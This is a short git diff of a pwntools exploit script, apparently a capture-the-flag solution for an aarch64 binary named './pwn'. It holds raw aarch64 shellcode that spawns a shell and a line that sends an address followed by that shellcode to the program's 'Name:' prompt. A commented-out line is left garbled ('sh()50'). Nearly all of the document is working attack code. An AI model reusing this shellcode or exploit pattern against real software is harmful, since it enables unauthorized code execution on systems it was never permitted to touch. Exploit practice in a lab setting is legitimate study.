@@ -1,5 +1,4 @@
 from pwn import*
-#binary = './pwn'
 context.log_level="debug"
 context.binary = "./pwn"
 
@@ -13,7 +12,7 @@ else:
 
 #pause()
 shellcode="\xee\x45\x8c\xd2\x2e\xcd\xad\xf2\xee\xe5\xc5\xf2\xee\x65\xee\xf2\x0f\x0d\x80\xd2\xee\x3f\xbf\xa9\xe0\x03\x00\x91\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x01\x00\x00\xd4"
-#shellcodeasm(shellcraft.aarch64.sh())
+#shellcode=asm(shellcraft.aarch64.sh()50
 p.sendafter("Name:",p64(0x400600)+p64(0)+shellcode)
 
 pause()
